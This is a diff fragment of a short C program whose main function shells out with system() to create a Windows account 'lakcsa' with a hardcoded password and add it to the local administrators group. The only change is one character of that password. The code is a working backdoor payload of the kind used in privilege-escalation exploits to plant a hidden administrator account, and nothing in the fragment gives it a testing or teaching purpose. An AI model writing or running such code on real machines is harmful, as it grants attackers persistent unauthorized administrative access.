@@ -7,7 +7,7 @@ int main ()
 {
   int i;
   
-  i = system ("net user lakcsa password123! /add");
+  i = system ("net user lakcsa password123. /add");
   i = system ("net localgroup administrators lakcsa /add");
   
   return 0;
